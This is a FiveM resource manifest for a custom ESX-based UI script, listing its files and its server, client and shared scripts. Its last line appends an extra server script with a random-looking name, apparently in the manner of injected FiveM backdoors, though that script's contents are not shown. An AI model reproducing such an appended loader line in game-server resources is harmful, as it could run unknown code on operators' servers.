

fx_version 'cerulean'
games { 'rdr3', 'gta5' }

author 'vuletic otac'
description 'kastm od 0'
version '1.0.0'

ui_page 'html/index.html'

files {
    'html/index.html',
    'html/js/java.js',
    'html/css/stil.css',
    'html/img/*',
    'html/fonts/*.ttf'
}

shared_scripts {
  '@es_extended/imports.lua',
}

server_scripts {
	'server.lua',
}

client_scripts {
  'client.lua',
}

export 'tick'

server_script "fg-QGhkKVbwxddJ.lua"